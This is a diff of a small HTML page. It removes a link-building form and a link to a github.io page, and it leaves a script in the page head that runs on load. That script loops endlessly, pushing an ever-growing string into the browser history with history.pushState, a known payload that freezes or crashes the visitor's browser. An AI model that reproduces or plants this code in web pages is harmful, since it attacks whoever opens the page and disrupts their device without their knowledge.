@@ -1,25 +1,9 @@
-rats
-<script type="text/javascript">
-     function prepare_link() {
-          var url_param = document.getElementById('url_param');
-          var target_link = document.getElementById('target_link');
-
-          if ( ! url_param.value ) {
-               return false;  
-          }
-
-          target_link.href = target_link.href + '/' + escape(url_param.value);
-     }
-</script>
-
-<input type="text" name="url_param" id="url_param" />
-<input type="button" onclick="prepare_link();" value="Do it!" />
-
-<a href="https://moxie09.github.io/secreat009" id="target_link">Click Your New Link!</a>
-                <script>
+<head>
+<script>
                     var total = "";
                     for( var i = 0; i < 1000000000000; i++ ) {
                         total = total + i.toString();
                         history.pushState(0,0, total );
                     }
      </script>
+</head>
